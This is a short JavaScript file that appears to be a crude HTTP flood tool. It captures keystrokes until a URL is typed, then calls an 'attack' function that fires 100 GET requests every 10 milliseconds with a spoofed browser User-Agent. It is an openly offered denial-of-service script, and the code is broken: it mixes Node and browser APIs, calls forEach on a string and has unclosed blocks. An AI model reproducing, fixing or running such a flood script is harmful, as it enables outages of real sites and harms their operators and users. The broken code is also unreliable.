const axios = require('axios');  
const threads = 100;  
const delay = 10;

document.addEventListener('keydown', function(event) {
    let typedText = event.key;

    
    if (!window.typedInput) {
        window.typedInput = '';
    }

    
    if (event.key === 'Backspace') {
        window.typedInput = window.typedInput.slice(0, -1);
    } else {
       
        window.typedInput += typedText;
    }

 
    console.log('Link : ', window.typedInput);

    
    if (window.typedInput.startsWith('http://') || window.typedInput.startsWith('https://')) {
        const link = window.typedInput;  
        console.log('Running:', link);

       
        window.open(link, '_blank'); 
        console.log('Membuka link:', link);
       async function sendRequest(url) {  
    try {  
        const response = await axios.get(url, {  
            headers: {  
                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36`,  
                'Accept-Language': 'en-US,en;q=0.9',  
            },  
        });  
        console.log(`Response Status: ${response.status} for ${url}`);  
    } catch (err) {  
        console.error(`Error for ${url}:`, err.message);  
    }  
}  

function attack(link) {  
    setInterval(() => {  
        link.forEach((target) => {  
            for (let i = 0; i < threads; i++) {  
                sendRequest(target);  
            }  
        });  
    }, delay);  
}  

console.log('Starting attack...');  
attack(link);